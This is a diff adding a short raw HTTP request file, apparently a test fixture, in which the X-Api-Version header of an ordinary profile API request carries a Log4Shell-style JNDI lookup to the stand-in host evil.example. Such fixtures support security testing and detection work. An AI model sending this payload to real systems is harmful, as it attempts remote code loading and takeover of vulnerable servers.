@@ -1,0 +1,8 @@
+GET /api/v1/profile HTTP/1.1
+Host: app.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Accept: application/json
+X-Api-Version: ${jndi:ldap://evil.example/a}
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.x
+Content-Length: 0
+
